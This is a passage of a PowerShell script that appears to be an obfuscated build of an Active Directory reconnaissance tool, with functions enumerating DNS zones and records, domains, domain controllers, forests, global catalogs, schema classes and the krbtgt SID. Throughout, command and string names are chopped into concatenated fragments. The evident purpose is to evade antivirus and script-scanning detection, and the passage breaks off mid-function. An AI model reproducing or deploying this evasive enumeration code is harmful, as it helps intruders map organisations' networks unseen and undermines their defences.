            $DNSRecordObject | &('Add-M'+'emb'+'er') Noteproperty ('Recor'+'dTy'+'pe') ('UNK'+'NO'+'WN')
        }

        $DNSRecordObject | &('A'+'dd-Me'+'mber') Noteproperty ('Up'+'datedAtSeri'+'a'+'l') $UpdatedAtSerial
        $DNSRecordObject | &('Ad'+'d-Mem'+'ber') Noteproperty ('T'+'TL') $TTL
        $DNSRecordObject | &('Ad'+'d-Membe'+'r') Noteproperty ('A'+'ge') $Age
        $DNSRecordObject | &('A'+'dd'+'-M'+'ember') Noteproperty ('Tim'+'eStam'+'p') $TimeStamp
        $DNSRecordObject | &('Add'+'-Mem'+'b'+'er') Noteproperty ('Dat'+'a') $Data
        $DNSRecordObject
    }
}


function Get-DomainDNSZone {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(('PS'+'Sho'+'uldProcess'), '')]
    [OutputType(('Po'+'werBla.D'+'N'+'SZon'+'e'))]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias(('Do'+'mainCon'+'tr'+'olle'+'r'))]
        [String]
        $Server,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Alias(('Retu'+'r'+'nOne'))]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        $SearcherArguments = @{
            ('LDA'+'P'+'Filter') = ('('+'obje'+'ctClass=d'+'nsZo'+'ne)')
        }
        if ($PSBoundParameters[('D'+'omain')]) { $SearcherArguments[('Dom'+'ain')] = $Domain }
        if ($PSBoundParameters[('Ser'+'ve'+'r')]) { $SearcherArguments[('Serv'+'er')] = $Server }
        if ($PSBoundParameters[('P'+'roper'+'tie'+'s')]) { $SearcherArguments[('Properti'+'e'+'s')] = $Properties }
        if ($PSBoundParameters[('Res'+'ul'+'t'+'PageSize')]) { $SearcherArguments[('Re'+'sul'+'tPageSiz'+'e')] = $ResultPageSize }
        if ($PSBoundParameters[('S'+'erve'+'rTimeL'+'imit')]) { $SearcherArguments[('Serv'+'erT'+'imeLi'+'mi'+'t')] = $ServerTimeLimit }
        if ($PSBoundParameters[('C'+'r'+'edential')]) { $SearcherArguments[('C'+'reden'+'tial')] = $Credential }
        $DNSSearcher1 = &('Get-'+'D'+'omai'+'nSearc'+'her') @SearcherArguments

        if ($DNSSearcher1) {
            if ($PSBoundParameters[('Fin'+'dOne')]) { $Results = $DNSSearcher1.FindOne()  }
            else { $Results = $DNSSearcher1.FindAll() }
            $Results | &('Whe'+'re-Ob'+'j'+'ect') {$_} | &('Fo'+'rEach'+'-Ob'+'ject') {
                $Out = &('Conve'+'rt'+'-LD'+'APProperty') -Properties $_.Properties
                $Out | &('Add'+'-'+'Member') NoteProperty ('Zon'+'eNa'+'me') $Out.name
                $Out.PSObject.TypeNames.Insert(0, ('PowerBl'+'a'+'.DNSZon'+'e'))
                $Out
            }

            if ($Results) {
                try { $Results.dispose() }
                catch {
                    &('Wri'+'te-Ve'+'rbose') ('[G'+'et-Domai'+'nD'+'F'+'SShar'+'e]'+' '+'Er'+'ror'+' '+'dispo'+'si'+'ng '+'of'+' '+'t'+'he '+'Res'+'ults'+' '+'obj'+'ect'+': '+"$_")
                }
            }
            $DNSSearcher1.dispose()
        }

        $SearcherArguments[('Sear'+'chB'+'ase'+'Pr'+'efix')] = ('C'+'N='+'MicrosoftD'+'N'+'S,DC=Domain'+'Dn'+'sZones')
        $DNSSearcher2 = &('Get'+'-Do'+'main'+'Se'+'archer') @SearcherArguments

        if ($DNSSearcher2) {
            try {
                if ($PSBoundParameters[('F'+'indOn'+'e')]) { $Results = $DNSSearcher2.FindOne() }
                else { $Results = $DNSSearcher2.FindAll() }
                $Results | &('Whe'+'re-Ob'+'ject') {$_} | &('Fo'+'rE'+'ach-O'+'bjec'+'t') {
                    $Out = &('Convert-'+'LDA'+'PPr'+'operty') -Properties $_.Properties
                    $Out | &('Ad'+'d-Mem'+'b'+'er') NoteProperty ('ZoneN'+'a'+'me') $Out.name
                    $Out.PSObject.TypeNames.Insert(0, ('P'+'owerBla.D'+'NS'+'Z'+'one'))
                    $Out
                }
                if ($Results) {
                    try { $Results.dispose() }
                    catch {
                        &('Wr'+'ite-Ver'+'b'+'o'+'se') ('[G'+'et-Doma'+'inDN'+'SZ'+'one] '+'Erro'+'r'+' '+'dispo'+'s'+'ing '+'of'+' '+'t'+'he '+'Resul'+'ts '+'obje'+'ct:'+' '+"$_")
                    }
                }
            }
            catch {
                &('Wri'+'t'+'e-Verb'+'ose') (('['+'Get-'+'DomainDNSZone] '+'Error accessin'+'g {0}'+'CN=Mi'+'crosoftDNS,DC=DomainDnsZ'+'o'+'n'+'e'+'s{0'+'}') -F [chaR]39)
            }
            $DNSSearcher2.dispose()
        }
    }
}


function Get-DomainDNSRecord {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(('PSSh'+'o'+'uldPr'+'ocess'), '')]
    [OutputType(('PowerBla.D'+'NS'+'Rec'+'ord'))]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0,  Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ZoneName,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias(('Dom'+'ainCont'+'rolle'+'r'))]
        [String]
        $Server,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties = ('name'+',disti'+'ngu'+'i'+'she'+'dn'+'ame,dnsre'+'co'+'r'+'d'+',whencreat'+'ed,'+'whencha'+'n'+'ge'+'d'),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Alias(('Retur'+'nO'+'ne'))]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        $SearcherArguments = @{
            ('LDAP'+'Fil'+'te'+'r') = ('(obje'+'c'+'tC'+'las'+'s=d'+'nsNode)')
            ('S'+'earc'+'hBa'+'sePr'+'efix') = "DC=$($ZoneName),CN=MicrosoftDNS,DC=DomainDnsZones"
        }
        if ($PSBoundParameters[('Do'+'mai'+'n')]) { $SearcherArguments[('Do'+'main')] = $Domain }
        if ($PSBoundParameters[('Ser'+'ver')]) { $SearcherArguments[('Se'+'rver')] = $Server }
        if ($PSBoundParameters[('Pr'+'o'+'perties')]) { $SearcherArguments[('P'+'roperti'+'e'+'s')] = $Properties }
        if ($PSBoundParameters[('ResultPa'+'ge'+'Siz'+'e')]) { $SearcherArguments[('R'+'e'+'sultP'+'age'+'Size')] = $ResultPageSize }
        if ($PSBoundParameters[('S'+'erv'+'erTimeL'+'i'+'mit')]) { $SearcherArguments[('Ser'+'verT'+'i'+'meLim'+'it')] = $ServerTimeLimit }
        if ($PSBoundParameters[('C'+'re'+'dential')]) { $SearcherArguments[('C'+'redenti'+'al')] = $Credential }
        $DNSSearcher = &('Get-D'+'o'+'ma'+'inS'+'ear'+'cher') @SearcherArguments

        if ($DNSSearcher) {
            if ($PSBoundParameters[('Find'+'One')]) { $Results = $DNSSearcher.FindOne() }
            else { $Results = $DNSSearcher.FindAll() }
            $Results | &('W'+'here'+'-Objec'+'t') {$_} | &('ForEa'+'ch-Ob'+'ject') {
                try {
                    $Out = &('Co'+'nvert-'+'L'+'DA'+'PProperty') -Properties $_.Properties | &('S'+'elect-Ob'+'j'+'ect') name,distinguishedname,dnsrecord,whencreated,whenchanged
                    $Out | &('Add-M'+'e'+'m'+'ber') NoteProperty ('Zon'+'eName') $ZoneName

                    if ($Out.dnsrecord -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                        $Record = &('C'+'o'+'nver'+'t'+'-DNSRecord') -DNSRecord $Out.dnsrecord[0]
                    }
                    else {
                        $Record = &('Co'+'nv'+'ert'+'-DNSRecord') -DNSRecord $Out.dnsrecord
                    }

                    if ($Record) {
                        $Record.PSObject.Properties | &('ForEach-O'+'b'+'ject') {
                            $Out | &('Ad'+'d'+'-Member') NoteProperty $_.Name $_.Value
                        }
                    }

                    $Out.PSObject.TypeNames.Insert(0, ('Pow'+'erBla'+'.'+'DNSRecord'))
                    $Out
                }
                catch {
                    &('Wr'+'ite'+'-Warni'+'ng') ('[Get-D'+'oma'+'inDNSRe'+'cord]'+' '+'E'+'rror: '+"$_")
                    $Out
                }
            }

            if ($Results) {
                try { $Results.dispose() }
                catch {
                    &('W'+'rite'+'-Verbose') ('[Get-D'+'o'+'m'+'ainD'+'N'+'SRecord'+'] '+'E'+'rror '+'dispos'+'in'+'g '+'o'+'f '+'t'+'he '+'Re'+'s'+'ults '+'o'+'bject:'+' '+"$_")
                }
            }
            $DNSSearcher.dispose()
        }
    }
}


function Get-Domain {


    [OutputType([System.DirectoryServices.ActiveDirectory.Domain])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        if ($PSBoundParameters[('Creden'+'tia'+'l')]) {

            &('W'+'rite-Verb'+'os'+'e') ('['+'G'+'et-'+'Dom'+'ain] U'+'sin'+'g alternate cr'+'edent'+'ials f'+'o'+'r'+' G'+'et'+'-'+'Doma'+'in')

            if ($PSBoundParameters[('Doma'+'in')]) {
                $TargetDomain = $Domain
            }
            else {
                $TargetDomain = $Credential.GetNetworkCredential().Domain
                &('Wr'+'i'+'te-Verbose') ('[Get-Dom'+'ai'+'n]'+' '+'Extract'+'ed'+' '+'domai'+'n'+' '+"'$TargetDomain' "+'fr'+'om '+'-Cre'+'dent'+'ia'+'l')
            }

            $DomainContext = &('Ne'+'w-'+'Ob'+'ject') System.DirectoryServices.ActiveDirectory.DirectoryContext(('D'+'o'+'main'), $TargetDomain, $Credential.UserName, $Credential.GetNetworkCredential().Password)

            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
            }
            catch {
                &('Wri'+'te-V'+'erb'+'os'+'e') ('[G'+'e'+'t-Dom'+'ain]'+' '+'T'+'he '+'s'+'pe'+'cifi'+'ed '+'dom'+'ai'+'n '+"'$TargetDomain' "+'do'+'es '+'not'+' '+'exist'+','+' '+'cou'+'ld '+'not'+' '+'be'+' '+'contact'+'ed'+','+' '+'ther'+'e '+(('i'+'snQqht'+' ')  -REpLACE'Qqh',[ChAr]39)+'an'+' '+'e'+'x'+'i'+'sting '+'tru'+'st, '+'o'+'r '+'the'+' '+'s'+'peci'+'fie'+'d '+'c'+'re'+'dentia'+'ls '+'are'+' '+'inv'+'alid: '+"$_")
            }
        }
        elseif ($PSBoundParameters[('Do'+'mai'+'n')]) {
            $DomainContext = &('New-Ob'+'j'+'ec'+'t') System.DirectoryServices.ActiveDirectory.DirectoryContext(('Do'+'ma'+'in'), $Domain)
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
            }
            catch {
                &('Wri'+'te'+'-Verbo'+'se') ('[Get'+'-Domain'+']'+' '+'T'+'he '+'s'+'p'+'ecified '+'d'+'omain '+"'$Domain' "+'doe'+'s '+'n'+'ot '+'exis'+'t, '+'coul'+'d '+'no'+'t '+'b'+'e '+'cont'+'acted,'+' '+'o'+'r '+'there'+' '+('is'+'nJx5t ').RePlaCE(([CHAr]74+[CHAr]120+[CHAr]53),[StRIng][CHAr]39)+'an'+' '+'ex'+'is'+'ting '+'tr'+'u'+'st '+': '+"$_")
            }
        }
        else {
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            }
            catch {
                &('Wr'+'i'+'te-'+'V'+'erbose') ('[Get-'+'D'+'om'+'ain] '+'Error'+' '+'retr'+'i'+'eving'+' '+'the'+' '+'cur'+'ren'+'t '+'dom'+'ain: '+"$_")
            }
        }
    }
}


function Get-DomainController {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(('PSShou'+'l'+'d'+'Process'), '')]
    [OutputType(('P'+'o'+'wer'+'Bla.Comp'+'ut'+'er'))]
    [OutputType(('S'+'ystem.DirectoryServ'+'ic'+'e'+'s.'+'Act'+'iveD'+'i'+'rec'+'tor'+'y.Do'+'m'+'ain'+'Controller'))]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias(('Dom'+'a'+'in'+'Controll'+'er'))]
        [String]
        $Server,

        [Switch]
        $LDAP,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        $Arguments = @{}
        if ($PSBoundParameters[('Do'+'main')]) { $Arguments[('D'+'omain')] = $Domain }
        if ($PSBoundParameters[('Cr'+'e'+'d'+'ential')]) { $Arguments[('Cre'+'de'+'nti'+'al')] = $Credential }

        if ($PSBoundParameters[('LD'+'AP')] -or $PSBoundParameters[('Se'+'rve'+'r')]) {
            if ($PSBoundParameters[('Serve'+'r')]) { $Arguments[('Se'+'rv'+'er')] = $Server }

            $Arguments[('L'+'DAP'+'Filter')] = ('(use'+'rAc'+'co'+'untContr'+'ol'+':'+'1.2'+'.840'+'.113556.1.4'+'.80'+'3:=8'+'192'+')')

            &('Get-Doma'+'i'+'nCo'+'mpute'+'r') @Arguments
        }
        else {
            $FoundDomain = &('Get-'+'D'+'omain') @Arguments
            if ($FoundDomain) {
                $FoundDomain.DomainControllers
            }
        }
    }
}


function Get-Forest {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(('PS'+'Should'+'Pro'+'cess'), '')]
    [OutputType(('System.Ma'+'nage'+'m'+'en'+'t.Au'+'t'+'o'+'matio'+'n.P'+'SCust'+'omObject'))]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Forest,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        if ($PSBoundParameters[('Creden'+'ti'+'al')]) {

            &('Writ'+'e-V'+'er'+'bose') ('[Get-F'+'ores'+'t'+']'+' Using alterna'+'te '+'c'+'r'+'e'+'dentials fo'+'r '+'Ge'+'t'+'-For'+'e'+'st')

            if ($PSBoundParameters[('F'+'or'+'est')]) {
                $TargetForest = $Forest
            }
            else {
                $TargetForest = $Credential.GetNetworkCredential().Domain
                &('Write-'+'Ver'+'bo'+'se') ('[G'+'et-Forest]'+' '+'Extra'+'c'+'te'+'d '+'doma'+'in '+"'$Forest' "+'from'+' '+'-'+'C'+'redential')
            }

            $ForestContext = &('New-O'+'bje'+'ct') System.DirectoryServices.ActiveDirectory.DirectoryContext(('Fo'+'rest'), $TargetForest, $Credential.UserName, $Credential.GetNetworkCredential().Password)

            try {
                $ForestObject = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($ForestContext)
            }
            catch {
                &('W'+'rite-'+'Verbose') ('['+'G'+'et-Fores'+'t]'+' '+'Th'+'e '+'s'+'peci'+'fied'+' '+'fore'+'s'+'t '+"'$TargetForest' "+'d'+'oes '+'n'+'ot '+'exi'+'st, '+'co'+'uld '+'n'+'ot '+'b'+'e '+'co'+'ntact'+'ed,'+' '+'the'+'re '+('isn'+'{0}'+'t ')  -f  [Char]39+'a'+'n '+'ex'+'isting '+'trus'+'t,'+' '+'o'+'r '+'th'+'e '+'s'+'pec'+'ified '+'credent'+'ial'+'s'+' '+'ar'+'e '+'in'+'v'+'alid: '+"$_")
                $Null
            }
        }
        elseif ($PSBoundParameters[('F'+'orest')]) {
            $ForestContext = &('New'+'-Ob'+'jec'+'t') System.DirectoryServices.ActiveDirectory.DirectoryContext(('For'+'es'+'t'), $Forest)
            try {
                $ForestObject = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($ForestContext)
            }
            catch {
                &('W'+'rite-Verbos'+'e') ('[G'+'et-'+'F'+'orest] '+'T'+'he '+'s'+'p'+'ecified '+'fo'+'r'+'est '+"'$Forest' "+'d'+'oes '+'n'+'ot '+'exis'+'t'+', '+'co'+'uld'+' '+'no'+'t '+'be'+' '+'contac'+'ted'+','+' '+'or'+' '+'th'+'ere '+(('i'+'sn6V4t ') -creplace '6V4',[cHaR]39)+'a'+'n '+'existi'+'n'+'g '+'tr'+'u'+'st: '+"$_")
                return $Null
            }
        }
        else {
            $ForestObject = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
        }

        if ($ForestObject) {
            if ($PSBoundParameters[('Cr'+'edenti'+'al')]) {
                $ForestSid = (&('G'+'et-DomainUs'+'er') -Identity ('kr'+'btgt') -Domain $ForestObject.RootDomain.Name -Credential $Credential).objectsid
            }
            else {
                $ForestSid = (&('G'+'e'+'t'+'-Domai'+'nUser') -Identity ('k'+'r'+'btgt') -Domain $ForestObject.RootDomain.Name).objectsid
            }

            $Parts = $ForestSid -Split '-'
            $ForestSid = $Parts[0..$($Parts.length-2)] -join '-'
            $ForestObject | &('Add-'+'Me'+'mb'+'er') NoteProperty ('RootDom'+'a'+'inS'+'i'+'d') $ForestSid
            $ForestObject
        }
    }
}


function Get-ForestDomain {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(('P'+'SSh'+'ou'+'ldPr'+'ocess'), '')]
    [OutputType(('System.D'+'ire'+'c'+'to'+'ryServices.Activ'+'eD'+'i'+'recto'+'r'+'y.D'+'omain'))]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Forest,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        $Arguments = @{}
        if ($PSBoundParameters[('F'+'orest')]) { $Arguments[('For'+'est')] = $Forest }
        if ($PSBoundParameters[('C'+'re'+'denti'+'al')]) { $Arguments[('Cred'+'en'+'tial')] = $Credential }

        $ForestObject = &('Get-'+'Fo'+'r'+'est') @Arguments
        if ($ForestObject) {
            $ForestObject.Domains
        }
    }
}


function Get-ForestGlobalCatalog {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(('PSShoul'+'dProces'+'s'), '')]
    [OutputType(('System.Direc'+'toryS'+'ervices.'+'Ac'+'tiv'+'eDirectory.'+'G'+'l'+'obalCat'+'a'+'log'))]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Forest,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        $Arguments = @{}
        if ($PSBoundParameters[('Fore'+'st')]) { $Arguments[('Fores'+'t')] = $Forest }
        if ($PSBoundParameters[('Crede'+'ntia'+'l')]) { $Arguments[('Cred'+'en'+'tial')] = $Credential }

        $ForestObject = &('G'+'et-For'+'est') @Arguments

        if ($ForestObject) {
            $ForestObject.FindAllGlobalCatalogs()
        }
    }
}


function Get-ForestSchemaClass {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(('PSShou'+'ld'+'Proce'+'s'+'s'), '')]
    [OutputType([System.DirectoryServices.ActiveDirectory.ActiveDirectorySchemaClass])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [Alias(('Clas'+'s'))]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ClassName,

        [Alias(('Nam'+'e'))]
        [ValidateNotNullOrEmpty()]
        [String]
        $Forest,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        $Arguments = @{}
        if ($PSBoundParameters[('Fore'+'st')]) { $Arguments[('Fo'+'rest')] = $Forest }
        if ($PSBoundParameters[('C'+'redenti'+'al')]) { $Arguments[('Cre'+'denti'+'al')] = $Credential }

        $ForestObject = &('Ge'+'t'+'-For'+'est') @Arguments

        if ($ForestObject) {
            if ($PSBoundParameters[('ClassNa'+'m'+'e')]) {
                ForEach ($TargetClass in $ClassName) {
                    $ForestObject.Schema.FindClass($TargetClass)
                }
            }
            else {
                $ForestObject.Schema.FindAllClasses()
            }
        }
    }
}


function Find-DomainObjectPropertyOutlier {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(('P'+'SShouldPro'+'ces'+'s'), '')]
    [OutputType(('P'+'owerBla'+'.P'+'ropertyO'+'utlier'))]
    [CmdletBinding(DefaultParameterSetName = {'Class'+'N'+'ame'})]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ParameterSetName = "c`L`AsSNAme")]
        [Alias(('Cl'+'ass'))]
        [ValidateSet(('Use'+'r'), ('Gro'+'up'), ('C'+'ompu'+'ter'))]
        [String]
        $ClassName,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $ReferencePropertySet,

        [Parameter(ValueFromPipeline = $True, Mandatory = $True, ParameterSetName = "re`F`e`R`eNCEoBjecT")]
        [PSCustomObject]
        $ReferenceObject,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias(('F'+'ilter'))]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias(('ADSPat'+'h'))]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias(('Doma'+'inCo'+'n'+'troll'+'er'))]
        [String]
        $Server,

        [ValidateSet(('Ba'+'se'), ('One'+'Lev'+'el'), ('Sub'+'tree'))]
        [String]
        $SearchScope = ('S'+'ub'+'tree'),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $UserReferencePropertySet = @(('admin'+'c'+'o'+'unt'),('accou'+'nt'+'expire'+'s'),('badp'+'asswordti'+'m'+'e'),('badpwd'+'c'+'ou'+'nt'),'cn',('cod'+'epage'),('co'+'untrycod'+'e'),('desc'+'r'+'iptio'+'n'), ('d'+'isplayna'+'m'+'e'),('di'+'st'+'i'+'ng'+'uishedn'+'ame'),('ds'+'c'+'orepropag'+'at'+'iondata'),('give'+'n'+'name'),('ins'+'tan'+'cet'+'ype'),('is'+'criti'+'ca'+'ls'+'ystemobject'),('last'+'l'+'ogo'+'ff'),('la'+'stlogo'+'n'),('l'+'astlogo'+'nti'+'m'+'estamp'),('lo'+'ckout'+'tim'+'e'),('l'+'ogonc'+'o'+'unt'),('membe'+'ro'+'f'),('msds-'+'sup'+'por'+'te'+'den'+'cr'+'ypti'+'ont'+'ypes'),('na'+'me'),('obj'+'ec'+'t'+'categ'+'ory'),('objec'+'tcl'+'a'+'ss'),('o'+'b'+'jectg'+'uid'),('ob'+'jectsid'),('prim'+'ary'+'gr'+'oup'+'id'),('p'+'wdlas'+'ts'+'et'),('s'+'a'+'maccount'+'name'),('samac'+'c'+'ountt'+'ype'),'sn',('u'+'sera'+'ccountcontr'+'ol'),('us'+'e'+'rpr'+'incipa'+'l'+'name'),('usnc'+'han'+'ged'),('usnc'+'r'+'eated'),('whench'+'a'+'nged'),('whencr'+'e'+'ated'))

        $GroupReferencePropertySet = @(('adm'+'inc'+'ount'),'cn',('de'+'sc'+'ripti'+'on'),('d'+'i'+'sti'+'nguishedname'),('ds'+'cor'+'epropagat'+'iondata'),('group'+'ty'+'pe'),('ins'+'t'+'ancet'+'ype'),('isc'+'r'+'iti'+'calsys'+'temobje'+'c'+'t'),('mem'+'b'+'er'),('m'+'emberof'),('n'+'ame'),('obj'+'ectc'+'ategor'+'y'),('obj'+'ec'+'tclass'),('objec'+'t'+'guid'),('obj'+'ectsi'+'d'),('samacc'+'oun'+'t'+'nam'+'e'),('s'+'amaccou'+'nttype'),('sy'+'st'+'emflags'),('usnc'+'han'+'ged'),('us'+'ncreat'+'ed'),('whenc'+'han'+'ged'),('whe'+'nc'+'reated'))

        $ComputerReferencePropertySet = @(('acc'+'oun'+'tex'+'pires'),('b'+'adpa'+'ss'+'wordtime'),('b'+'adpw'+'dcount'),'cn',('code'+'page'),('co'+'un'+'tr'+'ycode'),('dis'+'t'+'ing'+'uishednam'+'e'),('dnshost'+'na'+'me'),('dsco'+'r'+'epropagation'+'d'+'ata'),('inst'+'ance'+'t'+'ype'),('isc'+'rit'+'i'+'calsyste'+'m'+'object'),('l'+'astlogof'+'f'),('la'+'st'+'logon'),('lastlogontime'+'s'+'ta'+'mp'),('l'+'oc'+'alpolicyf'+'lag'+'s'),('logoncou'+'n'+'t'),('msds-suppor'+'tedencr'+'yptionty'+'pe'+'s'),('n'+'ame'),('ob'+'je'+'ctc'+'ate'+'gory'),('ob'+'j'+'ectcl'+'ass'),('obj'+'ectgui'+'d'),('object'+'sid'),('op'+'erat'+'ingsys'+'t'+'em'),('oper'+'a'+'ti'+'n'+'g'+'systemservice'+'pack'),('o'+'pe'+'rating'+'sy'+'stemversion'),('pr'+'ima'+'rygroupid'),('pwd'+'las'+'tset'),('sama'+'c'+'countn'+'ame'),('s'+'amacc'+'oun'+'tt'+'ype'),('servic'+'e'+'princi'+'palna'+'me'),('u'+'s'+'e'+'racco'+'untc'+'ontrol'),('usnc'+'ha'+'nged'),('usncrea'+'t'+'ed'),('whe'+'n'+'ch'+'anged'),('whe'+'ncre'+'ated'))

        $SearcherArguments = @{}
        if ($PSBoundParameters[('Dom'+'ain')]) { $SearcherArguments[('Doma'+'i'+'n')] = $Domain }
        if ($PSBoundParameters[('LD'+'APF'+'ilter')]) { $SearcherArguments[('LDA'+'P'+'Filter')] = $LDAPFilter }
        if ($PSBoundParameters[('Sear'+'c'+'hBase')]) { $SearcherArguments[('S'+'e'+'archBas'+'e')] = $SearchBase }
        if ($PSBoundParameters[('Ser'+'ve'+'r')]) { $SearcherArguments[('Se'+'rver')] = $Server }
        if ($PSBoundParameters[('Sear'+'c'+'hSco'+'pe')]) { $SearcherArguments[('S'+'earc'+'hSco'+'pe')] = $SearchScope }
        if ($PSBoundParameters[('Re'+'sultPa'+'g'+'eSiz'+'e')]) { $SearcherArguments[('R'+'esultPageSiz'+'e')] = $ResultPageSize }
        if ($PSBoundParameters[('Ser'+'verTi'+'meLimi'+'t')]) { $SearcherArguments[('Ser'+'verT'+'imeLimit')] = $ServerTimeLimit }
        if ($PSBoundParameters[('T'+'ombston'+'e')]) { $SearcherArguments[('To'+'mbst'+'o'+'ne')] = $Tombstone }
        if ($PSBoundParameters[('C'+'reden'+'tial')]) { $SearcherArguments[('Cre'+'d'+'e'+'ntial')] = $Credential }

        if ($PSBoundParameters[('Do'+'ma'+'in')]) {
            if ($PSBoundParameters[('Crede'+'n'+'tial')]) {
                $TargetForest = &('G'+'et-Domai'+'n') -Domain $Domain | &('S'+'elect-'+'O'+'bject') -ExpandProperty Forest | &('Sel'+'ect-'+'Object') -ExpandProperty Name
            }
            else {
                $TargetForest = &('Ge'+'t-Doma'+'in') -Domain $Domain -Credential $Credential | &('Sele'+'c'+'t'+'-Obj'+'ect') -ExpandProperty Forest | &('Selec'+'t-O'+'bject') -ExpandProperty Name
            }
            &('Wr'+'ite-'+'V'+'erbo'+'se') ('[F'+'ind'+'-Dom'+'ain'+'Ob'+'jectPr'+'opertyOut'+'li'+'e'+'r] '+'En'+'umerated'+' '+'f'+'or'+'est '+"'$TargetForest' "+'f'+'or '+'targ'+'et '+'dom'+'a'+'in '+"'$Domain'")
        }

        $SchemaArguments = @{}
        if ($PSBoundParameters[('Creden'+'ti'+'al')]) { $SchemaArguments[('Credent'+'ia'+'l')] = $Credential }
        if ($TargetForest) {
            $SchemaArguments[('For'+'est')] = $TargetForest
        }
    }

    PROCESS {

        if ($PSBoundParameters[('Refere'+'ncePropertyS'+'e'+'t')]) {
            &('Write-V'+'er'+'bos'+'e') ('[Find'+'-DomainO'+'bject'+'Proper'+'ty'+'Out'+'lier] '+'Using s'+'pe'+'c'+'ified'+' -Re'+'fe'+'renc'+'ePr'+'oper'+'t'+'y'+'Se'+'t')
            $ReferenceObjectProperties = $ReferencePropertySet
        }
        elseif ($PSBoundParameters[('Referenc'+'eObje'+'c'+'t')]) {
            &('Write'+'-Ve'+'rbo'+'se') ('[Find-Dom'+'ai'+'nObj'+'ec'+'tProperty'+'Outlie'+'r] E'+'x'+'tracti'+'ng'+' property name'+'s from -Refere'+'nceO'+'b'+'je'+'ct '+'to use '+'a'+'s the'+' reference'+' property set')
            $ReferenceObjectProperties = &('G'+'et-M'+'emb'+'er') -InputObject $ReferenceObject -MemberType NoteProperty | &('Select-'+'Obj'+'e'+'c'+'t') -Expand Name
            $ReferenceObjectClass = $ReferenceObject.objectclass | &('Select'+'-'+'Obje'+'ct') -Last 1
            &('Wr'+'ite-Ver'+'bose') ('['+'Fin'+'d-Dom'+'ain'+'ObjectPro'+'pe'+'rt'+'y'+'O'+'u'+'tlier] '+'C'+'alculate'+'d'+' '+'Refer'+'enceObje'+'ctCla'+'ss'+' '+': '+"$ReferenceObjectClass")
        }
        else {
